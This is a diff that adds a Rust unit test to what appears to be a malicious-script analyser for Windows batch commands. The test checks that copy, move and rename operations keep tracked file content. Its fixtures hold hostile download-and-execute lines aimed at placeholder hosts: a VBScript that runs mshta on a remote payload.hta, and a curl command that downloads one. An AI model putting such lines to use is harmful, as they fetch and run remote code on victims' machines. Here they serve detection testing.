@@ -14125,6 +14125,37 @@ call renamed.js"#,
     }
 
     #[test]
+    fn current_dir_single_source_file_ops_preserve_tracked_content() {
+        for command in [
+            r"copy .\original.vbs renamed.vbs",
+            r"xcopy /y .\original.vbs renamed.vbs",
+            r"move /y .\original.vbs renamed.vbs",
+            r"ren .\original.vbs renamed.vbs",
+        ] {
+            let mut env = Environment::new(&Config::default());
+            env.modified_filesystem.insert(
+                "original.vbs".to_string(),
+                FsEntry::Content {
+                    content: b"CreateObject(\"WScript.Shell\").Run \"mshta https://current-dir-copy.example/payload.hta\"".to_vec(),
+                    append: false,
+                },
+            );
+            interpret_line(command, &mut env);
+            let entry = env
+                .modified_filesystem
+                .get("renamed.vbs")
+                .unwrap_or_else(|| panic!("renamed.vbs missing after {command}"));
+            assert!(
+                matches!(entry, FsEntry::Content { content, .. }
+                    if content.windows(b"current-dir-copy.example".len())
+                        .any(|window| window == b"current-dir-copy.example")),
+                "current-dir tracked content was not preserved after {command}: {:?}",
+                entry
+            );
+        }
+    }
+
+    #[test]
     fn ren_full_path_source_preserves_directory_for_later_execution() {
         let report = crate::analyze(
             br#"curl -o C:\Temp\original.hta https://ren-dir-source.example/payload.hta
